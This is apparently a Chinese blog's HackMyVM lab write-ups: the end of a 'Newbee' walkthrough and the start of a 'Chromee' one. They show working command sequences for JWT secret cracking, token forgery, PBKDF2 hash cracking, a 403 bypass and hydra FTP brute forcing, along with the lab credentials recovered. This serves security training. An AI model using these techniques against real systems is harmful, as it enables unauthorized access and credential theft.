<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~$ cat config.php</span><br><span class="line">&lt;?php</span><br><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;root&quot;;</span><br><span class="line">$password = &quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$conn = new mysqli($servername, $username, $password);</span><br><span class="line"></span><br><span class="line">............</span><br><span class="line">............</span><br></pre></td></tr></table></figure>

<p>要拿到数据库的密码</p>
<p>查看端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~$ ss -lntup</span><br><span class="line">Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process</span><br><span class="line">udp    UNCONN  0       0              0.0.0.0:68          0.0.0.0:*</span><br><span class="line">tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*</span><br><span class="line">tcp    LISTEN  0       80           127.0.0.1:3306        0.0.0.0:*</span><br><span class="line">tcp    LISTEN  0       128          127.0.0.1:5000        0.0.0.0:*</span><br><span class="line">tcp    LISTEN  0       128               [::]:22             [::]:*</span><br><span class="line">tcp    LISTEN  0       511                  *:80                *:*</span><br></pre></td></tr></table></figure>

<p>可以发现本地有5000端口，用socat将5000端口转发出去</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~$ socat TCP-LISTEN:5001,fork TCP4:127.0.0.1:5000</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Newbee1.png"></p>
<p>是一个留言板，登录处除了admin，其他的都可以随意登录，cookie里有一个jwt，可以猜测是jwt伪造</p>
<p>可以用hashcat爆破</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# hashcat -a 0 -m 16500 ./1 /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</span><br><span class="line">============================================================================================================================================</span><br><span class="line">* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 2917/5898 MB (1024 MB allocatable), 8MCU</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger set to 90c</span><br><span class="line"></span><br><span class="line">Host memory required for this attack: 2 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMzEyMyIsImV4cCI6MTc0MzAyNTM4OH0.qTMF9XS0BYo7nKIDg9rFr1qmUfR4btXsLS7GZv2QVW4:noob</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 16500 (JWT (JSON Web Token))</span><br><span class="line">Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZS...v2QVW4</span><br><span class="line">Time.Started.....: Wed Mar 26 08:44:45 2025 (3 secs)</span><br><span class="line">Time.Estimated...: Wed Mar 26 08:44:48 2025 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:  2052.7 kH/s (0.87ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 5025792/14344385 (35.04%)</span><br><span class="line">Rejected.........: 0/5025792 (0.00%)</span><br><span class="line">Restore.Point....: 5021696/14344385 (35.01%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#1....: noobface888 -&gt; nona1807</span><br><span class="line">Hardware.Mon.#1..: Util: 44%</span><br><span class="line"></span><br><span class="line">Started: Wed Mar 26 08:44:44 2025</span><br><span class="line">Stopped: Wed Mar 26 08:44:49 2025</span><br></pre></td></tr></table></figure>

<p>noob就是密钥，用户名伪造成admin，可以看到留言板的内容</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Newbee2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~$ mysql -uroot -pTheStrongestPasswordHYHcreated</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 5</span><br><span class="line">Server version: 10.11.6-MariaDB-0+deb12u1 Debian 12</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">No entry for terminal type &quot;unknown&quot;;</span><br><span class="line">using dumb terminal settings.</span><br><span class="line">No entry for terminal type &quot;unknown&quot;;</span><br><span class="line">using dumb terminal settings.</span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt;</span><br></pre></td></tr></table></figure>

<p>user库的user表里有debian的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database changed</span><br><span class="line">MariaDB [user]&gt; select * from user;</span><br><span class="line">+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+</span><br><span class="line">| id | username | passwd</span><br><span class="line">                   | salt                             | passwd_hash_algo |</span><br><span class="line">+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+</span><br><span class="line">|  1 | debian   | 2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0 | 8bf3e3452b78544f8bee9400d6936d34 | pbdf2$50500$60   |</span><br><span class="line">+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+</span><br><span class="line">1 row in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>pbdf2爆破参考<a target="_blank" rel="noopener" href="https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256">https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat 2</span><br><span class="line">sha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# hashcat -a 0 ./2 /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat (v6.2.6) starting in autodetect mode</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</span><br><span class="line">============================================================================================================================================</span><br><span class="line">* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 2917/5898 MB (1024 MB allocatable), 8MCU</span><br><span class="line"></span><br><span class="line">Hash-mode was not specified with -m. Attempting to auto-detect hash mode.</span><br><span class="line">The following mode was auto-detected as the only one matching your input hash:</span><br><span class="line"></span><br><span class="line">10900 | PBKDF2-HMAC-SHA256 | Generic KDF</span><br><span class="line"></span><br><span class="line">NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!</span><br><span class="line">Do NOT report auto-detect issues unless you are certain of the hash type.</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">INFO: All hashes found as potfile and/or empty entries! Use --show to display them.</span><br><span class="line"></span><br><span class="line">Started: Wed Mar 26 08:49:58 2025</span><br><span class="line">Stopped: Wed Mar 26 08:49:59 2025</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# hashcat ./2 --show</span><br><span class="line">Hash-mode was not specified with -m. Attempting to auto-detect hash mode.</span><br><span class="line">The following mode was auto-detected as the only one matching your input hash:</span><br><span class="line"></span><br><span class="line">10900 | PBKDF2-HMAC-SHA256 | Generic KDF</span><br><span class="line"></span><br><span class="line">NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!</span><br><span class="line">Do NOT report auto-detect issues unless you are certain of the hash type.</span><br><span class="line"></span><br><span class="line">sha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA:1qaz2wsx</span><br></pre></td></tr></table></figure>

<p>用户home目录下还有一个.secret目录，里面有一个密码的压缩包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~$ cd .secret/</span><br><span class="line">debian@Newbee:~/.secret$ ls</span><br><span class="line">hint.txt  password.zip</span><br><span class="line">debian@Newbee:~/.secret$ cat hint.txt</span><br><span class="line">password is md5(key)</span><br><span class="line"></span><br><span class="line">and key is in mysql!!!!!!</span><br></pre></td></tr></table></figure>

<p>密码是1qaz2wsx的md5</p>
<p>图片是马赛克，网上有一个项目是用来恢复马赛克的</p>
<p><a target="_blank" rel="noopener" href="https://github.com/spipm/Depixelization_poc">https://github.com/spipm/Depixelization_poc</a></p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Newbee3.png"></p>
<p>其实也不用跑，图片的原图就是这个项目的示例图片</p>
<p>密码是<code>hellofromtheotherside</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:/tmp$ su - root</span><br><span class="line">Password:</span><br><span class="line">root@Newbee:~#</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/03/21/Chromee/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/03/21/Chromee/" class="post-title-link" itemprop="url">HackmyVM-Chromee</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-03-21 19:11:42 / 修改时间：20:09:37" itemprop="dateCreated datePublished" datetime="2025-03-21T19:11:42+08:00">2025-03-21</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>8.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>arp-scan -l</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    0a:00:27:00:00:11       (Unknown: locally administered)</span><br><span class="line">192.168.31.2    08:00:27:01:8c:4d       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.100  08:00:27:f9:e1:65       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 2.402 seconds (106.58 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<p>ip为192.168.31.100,然后用nmap扫描端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.100 -p-</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-21 07:14 EDT</span><br><span class="line">Nmap scan report for chromee.hmv (192.168.31.100)</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">8080/tcp  open  http-proxy</span><br><span class="line">23333/tcp open  elxmgmt</span><br><span class="line">MAC Address: 08:00:27:F9:E1:65 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h1><p>gobuster扫描目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# gobuster dir -u &quot;http://192.168.31.100&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-me</span><br><span class="line">dium.txt -x .txt,.php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.31.100</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/post.php             (Status: 200) [Size: 3]</span><br><span class="line">/secret.php           (Status: 200) [Size: 549]</span><br></pre></td></tr></table></figure>

<p>有一个post.php和secret.php,secret.php不会解析成php会直接下载下来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#secret.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Secret&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    $greeting = date(&#x27;H&#x27;) &lt; 12 ? &#x27;早上好&#x27; : (date(&#x27;H&#x27;) &lt; 18 ? &#x27;下午好&#x27; : &#x27;晚上好&#x27;);</span><br><span class="line">    $visitorIP = htmlspecialchars($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;h1&gt;&#123;$greeting&#125;，adriana&lt;/h1&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt;当前时间：&quot; . date(&#x27;Y-m-d H:i:s&#x27;) . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt;你的IP：&#123;$visitorIP&#125;&lt;/p&gt;&quot;;</span><br><span class="line">    if (isset($_GET[&#x27;aaa&#x27;])) &#123;</span><br><span class="line">    	$file_content = file_get_contents(&#x27;/opt/note/dic.txt&#x27;);</span><br><span class="line">    	echo $file_content;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">    		die();</span><br><span class="line">	&#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h1 id="8080端口"><a href="#8080端口" class="headerlink" title="8080端口"></a>8080端口</h1><p>先用gobuster扫描一下目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# gobuster dir -u &quot;http://192.168.31.100:8080&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2</span><br><span class="line">.3-medium.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.31.100:8080</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/javascript           (Status: 301) [Size: 328] [--&gt; http://192.168.31.100:8080/javascript/]</span><br><span class="line">/silence              (Status: 403) [Size: 281]</span><br><span class="line">/server-status        (Status: 403) [Size: 281]</span><br></pre></td></tr></table></figure>

<p>有一个silence，访问发现Forbidden了</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Chromee1.png"></p>
<p>用bp的BypassPro插件发现换一种请求会变成301，感觉有问题，后面添加一个index.html发现绕过了</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/Chromee2.png"></p>
<p>有一个邮箱，将这个域名添加进hosts里，再去访问<a target="_blank" rel="noopener" href="http://chromee.hmv/secret.php%E5%8F%91%E7%8E%B0secret.php%E8%A7%A3%E6%9E%90%E4%BA%86%EF%BC%8CGET%E4%BC%A0%E5%85%A5aaa=1">http://chromee.hmv/secret.php发现secret.php解析了，GET传入aaa=1</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">下午好，adriana</span><br><span class="line">当前时间：2025-03-21 12:28:34</span><br><span class="line"></span><br><span class="line">你的IP：192.168.31.1</span><br><span class="line"></span><br><span class="line">The Lost Key Lily, a curious girl, found an old rusty key in the woods. Wondering where it belonged, she asked everyone in the village, but no one knew. One day, she discovered a locked stone well. To her surprise, the key fit. She opened it and descended into a hidden passage. There, she found an ancient chest filled with treasures. But the real treasure was a note inside: “The greatest treasure is the journey, not the prize.” Lily smiled, realizing the adventure was the real reward.</span><br></pre></td></tr></table></figure>

<p>这里有两个人名，adriana和Lily，用cupp各生成一个字典，然后将两个字典合并爆破ftp(23333端口)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class="line">└─# hydra -L ./name -P ./pass 192.168.31.100 ftp -s 23333 -f  -t 50</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-21 07:32:30</span><br><span class="line">[DATA] max 50 tasks per 1 server, overall 50 tasks, 208 login tries (l:2/p:104), ~5 tries per task</span><br><span class="line">[DATA] attacking ftp://192.168.31.100:23333/</span><br><span class="line">[23333][ftp] host: 192.168.31.100   login: adriana   password: Lily2020</span><br><span class="line">[STATUS] attack finished for 192.168.31.100 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-21 07:32:31</span><br></pre></td></tr></table></figure>

<p>爆破出了账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp/test]</span><br><span class="line">└─# ftp adriana@192.168.31.100 23333</span><br><span class="line">Connected to 192.168.31.100.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls -al</span><br><span class="line">229 Entering Extended Passive Mode (|||20808|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 106      115          4096 Mar 09 08:13 .</span><br><span class="line">drwxr-xr-x    4 0        0            4096 Mar 09 08:12 ..</span><br><span class="line">-rw-r--r--    1 0        0            3414 Mar 09 08:13 ...</span><br><span class="line">-rw-r--r--    1 0        0             495 Mar 07 14:40 dic.txt</span><br><span class="line">226 Directory send OK.</span><br></pre></td></tr></table></figure>

<p>这有…文件，一开始以为是一个目录，cd不进去，也不看报错就没管了(唉，细节决定成败)导致卡了好长时间，但是卡的时候也没有荒废，在/srv目录下有一个zeus.conf，后面提权要用到</p>
